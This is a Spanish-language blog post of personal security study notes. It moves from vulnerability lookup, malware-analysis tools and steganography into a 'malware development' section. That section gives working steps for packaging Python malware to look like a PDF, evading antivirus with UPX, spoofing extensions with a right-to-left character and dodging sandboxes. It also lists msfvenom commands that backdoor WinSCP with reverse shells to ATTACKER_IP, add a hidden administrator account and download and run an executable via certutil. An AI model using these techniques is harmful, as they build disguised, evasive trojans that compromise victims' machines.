---
layout: post
author: Sergio Salgado
---

## [](#header-2)Escaneo de VUlnerabilidades
Podemos entrar al sitio CWE https://cwe.mitre.org/find/index.html para encontrar el tipo de vulnerabilidad asociada a ejemplo "smb".  La otra parte interesante dlel sitio es CWE List, la cual nos indicará la versión de cwe y en el listado un top 25 de software inseguros.

## [](#header-2)Malware Analysis
### [](#header-3)Local & Online Malware Scanning
- Hybrid Analysis (https://www.hybrid-analysis.com)
- Cukoo Sandbox (https://cuckoosandbox.org)
- Jotti (https://virusscan.jotti.org)
- Valkyre Sandbox (https://valkyrie.comodo.com)
- Online Scanner (https://www.fortiguard.com)

### [](#header-3)String Search
Herramientas:
- FLOSS (https://fireeye.com)
- Strings (https://docs.microsoft.com)
- Free EXE DLL Resource Extract (https://www.resourceextract.com)
- FileSeek (https://fileseek.ca)
- Hex Workshop (http://hexworkshop.com)
- BinText

### [](#header-3)Packing/Obfuscation Methods
- DIE (Detect It Easy)
- Macro_Pack (github.com)
- UPX (upx.github.io)
- ASPack (www.aspack.com)
- VMprotect (https://vmpsoft.com)
- ps2-packer (https://github.com)

### [](#header-3)Stenography Tools
-Snow - En la práctica, había un .txt con informacion oculta, para extraer la información usamos el comando
```s
SNOW.EXE -C Confidential.txt
```
Ejercicio de análisis de archivo .pcap con wireshark, un empleado usó la herramienta cover_TCP. Esta herramienta transforma los headers de los paquetes TCP, visitamos el sitio de github del creador y este nos da el ejemplo de como interceptar el mensaje(Filtrando o identificando los paquetes en negro o rojo) Al filtrar por la IP de destino o bien los paquetes rojos y examinarlos encontramos que en la parte de Transmission Control Protocol despues de cada parentesis encontramos cada caracter del mensaje.

### [](#header-3)Malware Analysis
Aqui he resuelto 2 ejercicios rápidamente, en el primero usé IDA para analizar un ejecutable, la misión era encontrar la llamada al KERNEL32.dll, bastó con buscarlo directamente y poner la direccion de memoria. El segundo ejercicio era analizar la arquitectura de un archivo ELF, en el cual tuve que usar GHYDRA, este software al utilizarlo me hizo un reporte detallado del programa y de aqui saque la arquitectura del programa.

Para analizar un servicio, untilicé la herramienta srvman.exe, el ejercicio trataba de poner el tipo de servicio que estaba corriendo, el cual era un driver.

### [](#header-3)Creacion de payloads
Hemos estado usando msfvenom para crear payloads, pero en esta ocasion tenemos un comando para buscar los tipos de payloads que se pueden usar para por ejemplo jsp
```s
msfvenom -l payloads | grep jsp
```

### [](#header-3)Decryption

Utilidad gpp-decrypt, para contrasenas AES "Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml" en windows.
```s
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

### [](#header-3)Malware developement
Para recuperar el path de python
```s
>>> import os, sys
>>> os.path.dirname(sys.executable)
```

La parte mas importante y que seguramente usaremos es empaquetar el malware hecho en python, para eso se requiere lo siguiente
1. Instalar el paquete de pip
```s
python -m pip install pyinstaller
```
2. Ejecutar el comando
```s
#Para que no se abra un prompt usamos la opcion --noconsole
pyinstaller.exe malware.py --onefile --noconsole

#Para empaquetar mas, en el path del archivo origen, podemos poner despues del punto y coma donde queremos que se guarde el archivo, comunmente la ruta TMP
pyinstaller.exe malware.py --add-data "[Path/archivo;C:\Users\%USERNAME%\AppData\Local\Temp]" --onefile --noconsole

#Para empaquetarlo con un icono y que parezca PDF, podemos ir al sitio de iconos www.iconfinder.com y escoger alguno como PDF, 
#los iconos deben estar en extension .ico, por lo que debemos convertirlo y tenemos que buscar png to ico y escogeremos el que mejor funcione.
pyinstaller.exe malware.py --add-data "[Path/archivo;C:\Users\%USERNAME%\AppData\Local\Temp]" --onefile --noconsole --icon pdf.ico reverse.exe
```
3. Extraer el archivo del directorio dist/ 
4. Bypass de antivirus: Para este paso, usaremos la herramienta UPX, podemos usar la version de linux y el comando quedaria de la forma:
```s
upx reverse_backdoor.exe -o compressed_backdoor.exe
```
5. Spoofing de extension de archivo: Podemos usar caracteres especiales, abrimos el link https://unicode-explorer.com/c/202E para en este caso usar el character right-to-left,Ahora solo tendremos que cambiar el nombre del archivo
```s
reverse.exe
reverse-‮fdp.exe
```

De acuerdo con tryhackme, existen diferentes formas de pasar desapercibido, en esta ocacion traigo un programa en python que nos hara el trabajo de infiltracion.
Evasion de Sandbox

- Las tacticas a usar son:
  - Agregar un timer, normalmente en un sandbox, se espera que el programa se ejecute inmediatamente para revelar sus acciones.
  - Verificar en el systeminfo si el equipo tiene mas de un core de procesador y mas de 4 GB en RAM, esto para hacer mas eficiente el rango de objetivos.
  - Verificar la IP, podemos consultar la ubicacion de donde se ejecuta con ayuda de los sitios 
    - https://ifconfig.me/all.json para ver la informacion de la 
    - https://rdap.apnic.net/ip para extraer mas data, como el pais, en este caso hemos escogido MX y US

Ofuscacion:
Lo que aplicaremos, sera con ayuda de chatgpt y algunos principios de ofuscacion
- Code-Element Layer
  - Obfuscating Layout
    - Junk Codes
    - Separation of Related Codes
    - Stripping Redundant Symbols
    - Meaningless Identifiers
  - Obfuscating Controls
    - Implicit Controls
    - Dispatcher-based Controls
    - Bogus Control Flows
  - Obfuscating Data
    - Array Transformation
    - Data Encoding
    - Data Procedurization
    - Data Splitting/Merging 
  - Obfuscating Methods
    - Method Proxy
    - Method Scattering/Aggregation
    - Method Clonde
    - Method Inline/Outline
  - Obfuscating Classes
    - Class Hierarchy Flattening
    - Class Splitting/Coalescing
    - Dropping Modifiers
- Software-Component Layer
- Inter Component Layer
  - Obfuscating Library Calls
  - Obfuscating Resources    
- Application Layer
  - Obfuscating DRM Systems
  - Obfuscating Neural Networks

Funcionalidades extra:
- Descargar y ejecutar un programa desde github, que aparentemente eso es una actividad normal
- Automatizar el exito del reverseshell. En el listener ejecutar comandos de reconocimiento en cuanto se conecte(Opcional)

Con msfvenom
```s
#Empaquetando un comando
msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp
#Binding WinSCP
msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
#Con un encoder, "msfvenom --list encoders | grep excelent para listarlos", -i para especificar las iteraciones de encriptado
msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=192.168.1.17 lport=1234 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -i 5 -f exe -o WinSCP-evil.exe 
#Encriptar con msfvenom "msfvenom --list encrypt"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "R3&1(k" -o xored-revshell.exe
#raw shellcode, para binarios de windows 
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
```

msfvenom -a x64 -p windows/x64/exec -x WinSCP.exe CMD='certutil.exe -urlcache -split -f https://github.com/Rebick/dangerous/raw/refs/heads/main/pdf2.exe C:\Windows\Temp\pdf.exe && C:\Windows\Temp\malicious.pdf' -e x86/shikata_ga_nai --encrypt xor --encrypt-key "R3&1(k" -b '\x00\x0a\x0d -i 5' -f exe -o tacticas_jiraya.exe